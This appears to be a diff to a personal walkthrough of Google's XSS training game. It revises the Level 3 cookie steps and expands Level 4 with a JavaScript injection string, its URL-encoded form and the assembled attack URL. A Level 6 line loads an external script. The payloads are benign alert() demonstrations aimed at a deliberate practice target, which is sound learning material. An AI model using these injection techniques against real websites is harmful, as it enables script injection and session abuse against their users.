@@ -43,15 +43,16 @@ But I wanted to keep working with Firefox. So I copied Safari's cookie called "l
 1. I exploited Level 1 and 2 as described above.
 1. I visited the URL for level three, with the attack code appended, as shown above. When the `alert()` popped up, the game set a new cookie called `level3`.
 1. I copied the name and value of the third cookie:
-```code
-level1=f148716ef4ed1ba0f192cde4618f8dc5;
-level2=b5e530302374aa71cc3028c810b63641;
-level3=d5ce029d0680b3816a349da0d055fcfa;
-```
-Here's how to set a new cookie in FF or Chrome using the console in dev tools:
-```javascript
-document.cookie="level3=d5ce029d0680b3816a349da0d055fcfa";
-```
+  ```code
+  level1=f148716ef4ed1ba0f192cde4618f8dc5;
+  level2=b5e530302374aa71cc3028c810b63641;
+  level3=d5ce029d0680b3816a349da0d055fcfa;
+  ```
+  Here's how to set a new cookie in FF or Chrome using the console in dev tools:
+  ```javascript
+  document.cookie="level3=d5ce029d0680b3816a349da0d055fcfa";
+  ```
+
 Now you can advance to level 4 in FF or Chrome. But, unlike the other cookies set by the game, the manually-set cookie will be set to expire at the end of the session. So if you close your browser tab for `xss-game.appspot.com`, then open a new tab to that website, you'll find that you can't go to Level 4. This is because the `level3` cookie expired when the previous session ended. So the better way to manually set that cookie is to include a value for the `expires` attribute:
 
 ```javascript
@@ -63,10 +64,43 @@ You can set several other cookie attributes like this, but the [specification][2
 
 ## [Level 4](https://xss-game.appspot.com/level4)
 
-For Level 4 I had to look up somebody else's answer and play with it because it was not working as they described. Eventually I found that, in all three browsers, it only worked if you input it into the input field. It would not work on the URL.
+I couldn't figure out Level 4. I had to Google somebody else's answer and then play with it because it was not working as they described. Eventually I found that, in all three browsers, this string worked if you input it into the form field and clicked the "create timer" button.
+
 ```
 ');alert();var b=('
 ```
+
+But to get this attack to work by injecting directly into the URL, you first have to URL-encode the attack string:
+
+```
+%27%29%3Balert%28%29%3Bvar+b%3D%28%27
+```
+
+There are websites that will do this for you. But they can be buggy and unreliable. Recently I've been using this, which is included by default with Python 2.7.x:
+
+```python
+>>> import urllib
+>>> foo = "');alert();var b=('"
+>>> urllib.quote_plus(foo)
+'%27%29%3Balert%28%29%3Bvar+b%3D%28%27'
+```
+
+Remember to surround the attack string with double quotes in the variable assignment. Also remember to remove the outer single quotes that Python added to the output. It's slightly different in Python 3. I learned about this in an [answer][3] on StackExchange.com.
+
+Now, similar to the URL assembly we did for Level 1, we need to prepend the attack string with the right variable name, preceded by a `?` and followed by a `=`. We're concatenating these elements:
+
+1. `https://xss-game.appspot.com/level4/frame`
+2. `?timer=`
+3. `%27%29%3Balert%28%29%3Bvar+b%3D%28%27`
+
+Which becomes:
+
+```code
+https://xss-game.appspot.com/level4/frame?timer=%27%29%3Balert%28%29%3Bvar+b%3D%28%27
+```
+
+Now just click the "Go" button in the fake browser.
+
 
 ## [Level 5](https://xss-game.appspot.com/level5)
 To get through this level you have to do these in order:
@@ -110,3 +144,4 @@ https://xss-game.appspot.com/level6/frame#HTTPS://xss.rocks/xss.js
 ```
 [1]: https://xss-game.appspot.com/
 [2]: https://developer.mozilla.org/en-US/docs/Web/API/Document/cookie
+[3]: http://stackoverflow.com/a/9345102
